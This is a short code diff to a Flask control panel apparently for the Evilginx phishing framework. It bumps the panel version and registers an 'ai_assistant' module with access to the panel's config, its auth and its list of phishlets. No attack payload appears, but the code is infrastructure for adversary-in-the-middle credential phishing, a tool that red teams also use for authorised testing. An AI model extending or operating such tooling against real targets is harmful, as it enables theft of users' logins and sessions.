@@ -43,7 +43,7 @@ PANEL_HOST = os.environ.get("PANEL_HOST", "0.0.0.0")
 PANEL_PORT = int(os.environ.get("PANEL_PORT", "8443"))
 PANEL_USER = os.environ.get("PANEL_USER", "root")
 PANEL_PASS = os.environ.get("PANEL_PASS", "")
-PANEL_VERSION = "3.5.7"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
+PANEL_VERSION = "3.5.8"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  FLASK SETUP
@@ -2533,6 +2533,14 @@ def api_egx_429():
         return jsonify(error="forbidden"), 403
     data = request.get_json(force=True, silent=True) or {}
     return jsonify(pxe.record_auth_429(data.get("phishlet") or "", data.get("host") or "", data.get("path") or ""))
+
+
+import ai_assistant
+ai_assistant.register(
+    app, auth=auth, egm=egm,
+    read_config=_read_config, write_config=_write_config,
+    list_phishlets=_list_phishlets,
+)
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
